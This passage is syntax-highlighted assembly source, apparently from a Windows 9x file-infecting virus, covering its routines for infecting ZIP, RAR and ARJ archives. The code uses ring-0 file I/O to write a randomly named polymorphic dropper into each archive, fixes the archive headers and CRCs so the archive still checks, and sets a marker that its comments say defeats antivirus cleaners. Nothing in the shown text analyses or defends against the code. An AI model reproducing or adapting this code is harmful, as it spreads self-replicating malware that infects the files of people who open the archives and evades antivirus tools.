         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPRCompressed</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPRUncompressed</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">;set some ZIP stuff</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPLCompressed</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPLUncompressed</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ZIPRFileName</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Random4Name</span><span class="sc0">                      </span><span class="sc1">;random name</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPRFileName</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPLFilename</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_READFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ZIPEHeaderSize</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ZIPReadBuffer</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitFree</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPEHeaderId</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'KP'</span><span class="sc0">     </span><span class="sc1">;is a ZIP marker</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitFree</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPSignature</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0605h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitFree</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPNoDisk</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitFree</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPEntryDisk</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPEntrysDir</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPSizeDir</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">ZIPRHeaderSize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPOffsetDir</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPROffsetLHeaderR</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPSizeDir</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AllocMemory</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitFree</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferTwoHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_READFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPSizeDir</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">           </span><span class="sc1">;read tonz of headers and</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitDealloc</span><span class="sc0">                        </span><span class="sc1">;write they back after</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">                                   </span><span class="sc1">;modificationz</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ZIPRHeaderSize</span><span class="sc0">               </span><span class="sc1">;(ZIP really sux)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferTwoHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPSizeDir</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ZIPRHeaderId</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ZIPReadBuffer</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ZIPLHeaderId</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ZIPLHeaderId</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitDealloc</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPOffsetDir</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferOneHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitDealloc</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPSizeDir</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferTwoHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitDealloc</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ZIPEHeaderSize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ZIPReadBuffer</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
  </span><span class="sc5">ExitDealloc</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferTwoHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeallocMemory</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitRO</span><span class="sc0">

  </span><span class="sc5">InfectRAR</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileAttr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitUnmark</span><span class="sc0">                         </span><span class="sc1">;bahh... the same shit, but</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PreparateDropper</span><span class="sc0">                 </span><span class="sc1">;this time for RAR</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RARFileCRC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">RARFileName</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Random4Name</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RARCompressedSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RARUncompressedSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_READFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">Pad</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitFree</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'!raR'</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitFree</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">RARHeaderType</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">RARHeaderEnd</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">RARHeaderType</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RARHeaderCRC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">RARHeaderEnd</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">RARHeaderCRC</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">RARHeaderCRC</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferOneHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitRO</span><span class="sc0">

  </span><span class="sc5">InfectARJ</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileAttr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitUnmark</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PreparateDropper</span><span class="sc0">                 </span><span class="sc1">;uhh... again for ARJ</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ARJFileCRC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;(i only do this because there</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ARJFilename</span><span class="sc0">         </span><span class="sc1">;stupid peoples that run new</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Random4Name</span><span class="sc0">                      </span><span class="sc1">;strange filez)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ARJCompressedSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ARJUncompressedSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_READFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">Pad</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitFree</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0ea60h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitFree</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ARJHeaderCRC</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ARJ1HeaderSize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ARJ1HeaderSize</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ARJHeaderCRC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ARJEnd</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ARJHeaderId</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ARJHeaderId</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitFree</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferOneHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitFree</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ARJEnd</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">

  </span><span class="sc5">ExitRO</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileAttr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01b</span><span class="sc0">                      </span><span class="sc1">;set inf marker(avoid lame</span><span class="sc0">
  </span><span class="sc5">ExitFree</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;AVs like TBCLEAN, that cant</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferOneHandle</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;clean r-o file)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeAllocMemory</span><span class="sc0">
  </span><span class="sc5">ExitClose</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
  </span><span class="sc5">ExitUnmark</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc4">+</span><span class="sc5">SET_ATTRIBUTES</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileAttr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">             </span><span class="sc1">;restore attribz</span><span class="sc0">
         </span><span class="sc6">popad</span><span class="sc0">

  </span><span class="sc5">ExitCorrect</span><span class="sc4">:</span><span class="sc0">
